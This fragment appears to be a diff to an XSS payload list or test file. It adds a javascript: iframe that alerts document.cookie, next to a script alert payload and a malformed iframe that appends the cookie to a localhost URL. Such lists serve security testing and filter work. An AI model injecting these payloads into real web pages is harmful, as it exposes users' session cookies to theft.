@@ -2,5 +2,7 @@
 
 <script>alert(`XSS`)</script>
 
+<iframe src="javascript:alert(document.cookie)">
+
 <iframe src="http://localhost/" + document.cookie"></iframe>
 
